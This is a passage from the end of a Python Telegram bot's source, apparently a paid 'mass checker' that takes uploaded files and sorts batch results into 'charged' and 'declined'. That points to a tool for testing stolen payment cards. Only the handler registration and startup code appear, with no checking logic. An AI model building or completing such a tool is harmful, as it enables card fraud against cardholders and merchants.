    logger.info("Starting FN Mass Checker Bot")
    try:
        application = Application.builder().token(TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("sh", single_check))
        application.add_handler(CommandHandler("stop", stop))
        application.add_handler(CommandHandler("genkey", genkey))
        application.add_handler(CommandHandler("redeem", redeem))
        application.add_handler(CommandHandler("delkey", delkey))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(CallbackQueryHandler(button, pattern='upload_file|cancel_batch|help'))
        application.add_handler(CallbackQueryHandler(batch_button, pattern='charged|declined|total|stop_batch|response'))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))

        await application.run_polling()
    except Exception as e:
        logger.error(f"Bot startup failed: {str(e)}")
        raise

if __name__ == '__main__':
    asyncio.run(main())